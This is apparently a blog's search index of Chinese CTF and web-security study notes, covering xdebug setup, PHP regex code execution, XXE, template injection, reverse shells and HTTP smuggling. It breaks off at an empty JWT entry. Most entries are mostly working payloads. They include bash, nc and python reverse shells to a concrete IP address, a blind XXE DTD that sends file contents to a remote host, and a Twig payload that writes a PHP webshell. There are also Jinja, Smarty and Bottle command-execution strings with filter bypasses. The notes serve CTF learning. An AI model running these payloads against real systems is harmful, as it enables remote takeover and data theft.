<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>vscode调试thinkphp项目</title>
    <link href="/blogs/windows/vscode%E8%B0%83%E8%AF%95thinkphp%E9%A1%B9%E7%9B%AE/"/>
    <url>/blogs/windows/vscode%E8%B0%83%E8%AF%95thinkphp%E9%A1%B9%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="教训与启发"><a href="#教训与启发" class="headerlink" title="教训与启发"></a>教训与启发</h2><p>有的时候做一件事就不能为了快速到达目的而盲目的横冲直撞</p><p>做了一个ctfshow西瓜杯tpdoor的题目,是thinkphp框架, 想要调试一下, 于是下载了xdebug, 但是怎么也调试不了, 然后直接照着别人的浏览器一个一个的试(现在想起来感觉好愚蠢),试到头晕眼花也没搞成.</p><p>从图书馆会宿舍的路上静下心来想了想, 把事情梳理了一遍, 觉得如果先学习一下xdebug调试php代码的原理说不定事情就解决了,其实一点也不复杂.</p><h2 id="vscode调试thinkphp项目"><a href="#vscode调试thinkphp项目" class="headerlink" title="vscode调试thinkphp项目"></a>vscode调试thinkphp项目</h2><p>朴素理解, 未必准确</p><p>xdebug是php的扩展, 执行php代码的时候会被激活, 在断点处停下, 并从指定端口尝试连接IDE</p><p>vscode中的phpdebug扩展, 监听launch.json中定义的端口, 接受xdebug传递的信息以进行调试</p><p>因此配置好之后, 使用php think run运行php服务, 再F5监听端口即可.</p><p>这里的调试和本机直接调试不同, 调试并不立即执行代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php.ini```文件(版本3.x适用)">```<br>[xdebug]<br>zend_extension=D:/phpstudy/phpstudy_pro/Extensions/php/php8.2.9nts/ext/php_xdebug.dll<br>xdebug.collect_params=1<br>xdebug.collect_return=1<br>xdebug.auto_trace=Off<br>xdebug.output_dir=&quot;D:/phpstudy/phpstudy_pro/Extensions/php_log/php8.2.9nts.xdebug.trace&quot;<br>xdebug.profiler_enable=Off<br>xdebug.remote_enable=Off<br>xdebug.client_host=localhost<br>xdebug.client_port=9003<br>xdebug.log=&quot;D:\xdebug_log&quot;<br>xdebug.mode = debug<br>xdebug.start_with_request=yes<br>xdebug.remote_handler=dbgp<br></code></pre></td></tr></table></figure><p><code>launch.json</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.2.0&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Debug ThinkPHP&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;php&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;launch&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">9003</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;pathMappings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;D:/code/test/tp/public&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/public&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;D:/code/test/tp/app&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/app&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>当服务器与本地路径不一致时，需通过映射让 IDE 正确关联断点<br>(比如WSL中运行服务, IDE在主机上运行)</p>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/blogs/uncategorized/"/>
    <url>/blogs/uncategorized/</url>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/news/16942">bottle模板注入以及内存马</a><br><a href="https://forum.butian.net/share/4048">bottle内存马</a>‘</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/blogs/uncategorized/"/>
    <url>/blogs/uncategorized/</url>
    
    <content type="html"><![CDATA[<h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p>一个用于查看文件的软件，会持久化suid，可能可以用于读root的文件</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>反向shell</title>
    <link href="/blogs/uncategorized/%E5%8F%8D%E5%90%91shell/"/>
    <url>/blogs/uncategorized/%E5%8F%8D%E5%90%91shell/</url>
    
    <content type="html"><![CDATA[<p>提供一个面向用户的命令接口</p><p>各种反向shell生成：<br><a href="https://www.revshells.com/">https://www.revshells.com/</a></p><ul><li>核心目的是让目标系统（服务端）上的bash shell与攻击者控制的服务器（攻击端）建立一个连接，并且将目标系统上的命令执行结果（标准输出和标准错误）发送给攻击者，同时将攻击者的输入（通过同一个连接）作为目标系统的命令输入。</li></ul><p>典型bash反向shell</p><p>在攻击者端运行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">nc -lvvp <span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span><br></code></pre></td></tr></table></figure><p>再服务端上运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/bash -i &gt;&amp; /dev/tcp/121.37.168.204/7777  0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>即把标准输出和错误输出重定向到ip&#x2F;port中，<br>然后把标准输入重定向到标准输出中，这样标准输入也重定向到ip&#x2F;port中了<br>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc 121.37.168.204 7777 -e sh<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import sys,socket,os,pty;s=socket.socket();s.connect((&quot;121.37.168.204&quot;,7777));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>php命令执行函数</title>
    <link href="/blogs/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/"/>
    <url>/blogs/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="preg-match的-e模式"><a href="#preg-match的-e模式" class="headerlink" title="preg_match的&#x2F;e模式"></a>preg_match的&#x2F;e模式</h2><p><a href="https://xz.aliyun.com/t/2557">文章</a></p><p>题目来自<a href="https://buuoj.cn/challenges#[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4">buu-BJDCTF2020_January</a></p><p>preg_match(pattern, 替换成的字符串, str)<br>当pattern中采用了&#x2F; &#x2F; ..e模式时，每当str中匹配到pattern，就会把参数2当做代码执行。</p><ol><li>参数2可控 —&gt; 直接执行命令</li><li>参数2固定格式，如</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">url?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&quot;ls&quot;)<br></code></pre></td></tr></table></figure><p><code>\\1</code>是正则表达式中的第一个捕获项，由于表达式是(\S*)，$str均被匹配,因此<br>执行的是<code>strtolower(&quot;$&#123;getFlag()&#125;&quot;)</code><br>接下来回答以下几个问题<br><strong>Q1：</strong> 为什么不使用.*匹配<br>A: 以下这些字符作为变量名时,会被替换成’_’,其中就包括了字符’.’<br><img src="/blogs/images/chr_to__.png"></p><p><strong>Q2:</strong> 为什么要用${getFlag()}而不用getFlag()?<br>A: 因为如果用后者,那么将执行<code>strtolower(&quot;getFlag()&quot;)</code>,其中getFlag()只是普通的字符串.而执行<code>strtolower(&quot;$&#123;getFlag()&#125;&quot;)</code>, 其中${}的格式是<a href="https://www.php.net/manual/zh/language.variables.variable.php">可变变量</a><br>,也就是会先自动解析{}中的变量,然后再把它作为变量名.显然$flag{…}是未定义的变量,也就是null.所以得到flag依赖于getFlag()函数中将flag打印出来<br><strong>Q3:</strong> 为什么不能直接<code>url?\S*=$&#123;system(&#39;ls&#39;)&#125;</code>?<br>A: 经测试会报错 unexpected “ls”</p><p>2025&#x2F;3&#x2F;10: </p><p>传递的参数是字符串，<code>&#39;</code>和<code>&quot;</code>也不例外, 因此<code>&#39;</code>变认为是一个常量字符串,<br>传递<code>url?\S*=$&#123;system(&#39;ls&#39;)&#125;</code>时, 执行的是<code>strtolower(&quot;$&#123;system(\&#39;ls\&#39;)&#125;&quot;)</code>, 也就是说<code>&#39;</code>会被转义, 因此会报<code>syntax error, unexpected &#39;</code><br><img src="/blogs/images/preg_match_syntax_error.png" alt="alt text"><br>和网页上的报错一致</p><p>终于…</p><hr><p>可能与<code>&#39;strtolower(&quot;\\1&quot;)&#39;</code>中把<code>&#39;</code>和<code>&quot;</code>都用掉了有关系,导致<br>$str这个参数不能出现引号. &#x3D;&#x3D;&gt; nope</p><p>奇怪的是<code>url?\S*=$&#123;system(ls)&#125;</code>意外的可以运行<br>但是<code>ls /</code>又不能运行, … 暂时不深究</p><hr>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/blogs/XXE/xxe/"/>
    <url>/blogs/XXE/xxe/</url>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/news/2994#toc-10">参考文章</a><br><a href="https://xz.aliyun.com/t/6887">xml、xpath注入</a></p><h2 id="xml注入"><a href="#xml注入" class="headerlink" title="xml注入"></a>xml注入</h2><p>参考xss注入</p><h2 id="xpath注入"><a href="#xpath注入" class="headerlink" title="xpath注入"></a>xpath注入</h2><p>参考sql注入</p><h2 id="xxe-xml外部实体引用"><a href="#xxe-xml外部实体引用" class="headerlink" title="xxe (xml外部实体引用)"></a>xxe (xml外部实体引用)</h2><h3 id="有回显情况"><a href="#有回显情况" class="headerlink" title="有回显情况"></a>有回显情况</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$xmlfile</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)<br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br><span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>payload &#x3D; </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hack</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span>  <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span> <br>        随意<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中<code>&amp;file;</code>用于引用访问结果<br>如果环境中装有expect扩展，把<code>php://filter/read=convert.base64-encode/resource=/flag</code>换成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs expect://ls```可以实现任意命令执行."><br><br>### 无回显<br><br>vps上部署evil.dtd<br><br>```dtd<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/temp/test.ps1&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:7777?p=%file;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure><p>这部分必须在vps上是因为 只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>send前面的%必须要编码，可能如果不编码会被识别为参数，但找不到%send</p><p>上传的xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!DOCTYPE convert [<br>&lt;!ENTITY % remote SYSTEM &quot;http://ip:7777/evil.dtd&quot;&gt;<br>%remote;%int;%send;<br>]&gt;<br>&lt;user&gt;<br>    &lt;username&gt;www&lt;/username&gt;<br>    &lt;password&gt;&lt;/password&gt;<br>&lt;/user&gt;<br></code></pre></td></tr></table></figure><p><strong>疑问：</strong></p><ol><li>为什么vps的dtd文件中不能直接定义<br><code>&lt;!ENTITY % send SYSTEM &#39;http://ip:7777?p=%file;&#39; &gt;</code><br>然后执行 <code>%send;</code> ?</li><li>为什么非得用参数实体？</li></ol>]]></content>
    
    
    <categories>
      
      <category>XXE</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SSTI模版注入</title>
    <link href="/blogs/SSTI/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"/>
    <url>/blogs/SSTI/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p><img src="/blogs/images/SSTI.png" alt="SSTI"></p><p>另外，bottle 可以直接通过 <code>% python—code </code>或 <code>&lt;% %&gt;</code>执行, 但无回显，可以反弹shell或者打内存马<br>通过abort可以直接回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">%__import__(&#x27;bottle&#x27;).abort(404,__import__(%27os%27).popen(&#x27;env&#x27;).read())<br></code></pre></td></tr></table></figure><p><img src="/blogs/images/bottle%E5%B5%8C%E5%85%A5python%E4%BB%A3%E7%A0%81.png" alt="bottle嵌入python代码"><br><a href="https://www.osgeo.cn/bottle/stpl.html">bottle文档</a></p><p><a href="https://xz.aliyun.com/news/16942">bottle模板注入以及内存马</a><br><a href="https://forum.butian.net/share/4048">bottle内存马</a></p><p>需要注意原来的app是怎么运行的，<br>方式1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">app = bottle.Bottle()<br>app.run<br></code></pre></td></tr></table></figure><p>这时直接app.route(“&#x2F;shell”,”GET”,lambda:…)<br>也可以app.add_hook(…)<br>方式2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">bottle.run<br></code></pre></td></tr></table></figure><p>这时直接bottle.route修改路由可行<br>但是没有add_hook, 想执行bottle.Bottle().add_hook能执行,但是没有效果</p><h2 id="twig模板注入"><a href="#twig模板注入" class="headerlink" title="twig模板注入"></a>twig模板注入</h2><p><a href="https://xz.aliyun.com/news/9506">https://xz.aliyun.com/news/9506</a></p><ol><li>1.x版本payload: <code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("echo '<?=@eval($_POST[1]);?>' > flag.php")&#125;&#125;</code></li><li>2.x&#x2F;3.x 版本payload：<code>&#123;&#123;["ls"]|map("system")&#125;&#125;</code>或者<code>&#123;&#123;["id"]|filter("system")&#125;&#125;</code>或者<code>&#123;&#123;["id", 0]|sort("system")&#125;&#125;</code>或者<code>&#123;&#123;[0, 0]|reduce("system", "id")&#125;&#125;</code></li></ol><h2 id="smarty模板注入"><a href="#smarty模板注入" class="headerlink" title="smarty模板注入"></a>smarty模板注入</h2><p><a href="https://xz.aliyun.com/t/12220">https://xz.aliyun.com/t/12220</a></p><p>曾经用到的方法：</p><ol><li>{if PHP代码}{&#x2F;if}<br> 如 {if system(‘cat &#x2F;flag’)}{&#x2F;if}</li></ol><h2 id="python模板注入漏洞"><a href="#python模板注入漏洞" class="headerlink" title="python模板注入漏洞"></a>python模板注入漏洞</h2><h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><h2 id="jinja"><a href="#jinja" class="headerlink" title="jinja"></a>jinja</h2><p><a href="https://xz.aliyun.com/news/6481">各种过滤</a><br><code>__globals__[&#39;os&#39;]</code>可以用<code>__globals__.os</code>直接代替,省去了中括号引号</p>获取配置<p><a href="https://buuoj.cn/challenges#[WesternCTF2018]shrine">配置被手动置为none</a>时，可以从其他的地方访问config，由于他们不会被同时置为none，因此还保留原有配置。<br>payload:<br><code>&#123;&#123;self.__dict__&#125;&#125;</code><br><code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br><code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;</code></p><h3 id="新姿势"><a href="#新姿势" class="headerlink" title="新姿势"></a>新姿势</h3><pre><code class="hljs">可以直接用undefined这个类，而且里面有很多可用函数，如 </code></pre><p><code>&#123;&#123;a.__init__.__globals__.__builtins__.eval(\"__\\x69mport__('o'+'s').popen('ls /').read()\")&#125;&#125;</code><br><code>self[&#39;__in&#39;&#39;it__&#39;][&#39;__glo&#39;&#39;bals__&#39;][&#39;__buil&#39;&#39;tins__&#39;][&#39;__impo&#39;&#39;rt__&#39;](&#39;o&#39;&#39;s&#39;).popen(&#39;ls;ls /;nl /flag&#39;).read()</code><br><code>c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)</code><br><code>c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;fla&#39;+&#39;g&#39;,&#39;r&#39;).read()</code><br>    ，甚至不用找可用的类……<br><strong>常见payload</strong></p><ol><li><p><code>&#123;&#123;''.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__['o'+'s'].popen('ls').read()&#125;&#125;</code></p></li><li><p><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')&#125;&#125;</code></p></li><li><p><code>&#123;&#123;''.__class__.__mro__[0].__subclasses__()[40]("fl4g").read()&#125;&#125;</code>，其中[40]是file类</p></li><li><p><code>&#39;&#39;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](\&quot;__\\x69mport__(&#39;os&#39;).popen(&#39;cat+/flag&#39;).read()\&quot;)</code><br> 132指warnings.catch_warnings</p></li></ol><p>当request没被过滤时,用request绕过</p><p><strong>原理解释</strong></p><p>Python复制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    <span class="hljs-built_in">id</span> = request.args.get(<span class="hljs-string">&#x27;id&#x27;</span>)<br>    html = <span class="hljs-string">&#x27;&lt;h3&gt;%s&lt;/h3&gt;&#x27;</span>%(<span class="hljs-built_in">id</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(html)<br></code></pre></td></tr></table></figure><p>某些渲染器如python-jinja会将<code>&#123;&#123;&#125;&#125;</code>内包围的内容视为变量，因此会先计算变量（本质上就是执行），因此可以在<code>&#123;&#123;&#125;&#125;</code>中写入想要执行的代码，这里的参数id可能比较特殊，参数值直接写在当前目录下就行。</p><p>接下来就要找到os模块，利用popen函数来获取文件内容（popen用于执行命令，将执行结果输入到文件中，并返回这个文件对象）。</p><p><code>__class__</code> 用于访问当前类，<code>__mro__</code> 访问当前类的基类，最后一个一般是object类，是所有类的基类，<code>__subclasses__()</code>方法返回基于当前类的所有之类，到这里可以得到所有可以用到的类，[71]中的数字可以用爆破的方式<code>&#123;&#123;url/"".__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__['os']&#125;&#125;</code>得到，目的是得到一个包含了，<code>__init__.__globals__</code>可以获得该类所在模块中的所有用到的全局变量，包括在该模块中引用的模块，返回类型是字典。</p><h3 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h3><p>fenjing</p><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>过滤关键词，如<code>os, eval</code>,可以用字符串拼接绕过<br>如<code>[&#39;ev&#39;+&#39;al&#39;]</code></p><p>引号内的字符还可以使用hex或unicode编码绕过<br>如<code>[&#39;eval&#39;] --&gt; [&#39;\x65val&#39;]</code><br>由于python会对字符串自动转义一次,写\x65 等于写 e,因此要写成<code>[&#39;\\x65val&#39;]</code>,这样真正发送的才是\x65</p><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><p><a href="https://blog.csdn.net/weixin_43995419/article/details/126811287">文章</a></p><p>利用config保存，set设置，逐步简短最终payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.update(a=config.update)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(b=lipsum.__globals__)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(c=config.b.os)%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">x</span>=config.a(d=config.c.popen)%&#125;<br>&#123;&#123;config.d(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;<br>&#123;&#123;config.d(<span class="hljs-string">&#x27;cat /f*&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SSTI</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>http请求走私</title>
    <link href="/blogs/uncategorized/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <url>/blogs/uncategorized/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
    
    <content type="html"><![CDATA[<p>http请求走私产生的原因是<br>前端服务器将多个报文拼接发送给后端服务器，而前端服务器和后端服务器对请求报文终止线划分不同导致的（content-length和Transfer-Encoding: chunked）</p><p>具体见：</p><h2 id="http1-1"><a href="#http1-1" class="headerlink" title="http1.1"></a>http1.1</h2><p><a href="https://xz.aliyun.com/news/12672">https://xz.aliyun.com/news/12672</a><br><a href="https://www.freebuf.com/articles/web/243652.html">https://www.freebuf.com/articles/web/243652.html</a></p><h2 id="http2"><a href="#http2" class="headerlink" title="http2"></a>http2</h2><p>协议降级情况下的请求走私<br><a href="https://xz.aliyun.com/news/12691">https://xz.aliyun.com/news/12691</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>jwt伪造</title>
    <link href="/blogs/jwt/jwt%E4%BC%AA%E9%80%A0/"/>
    <url>/blogs/jwt/jwt%E4%BC%AA%E9%80%A0/</url>
    
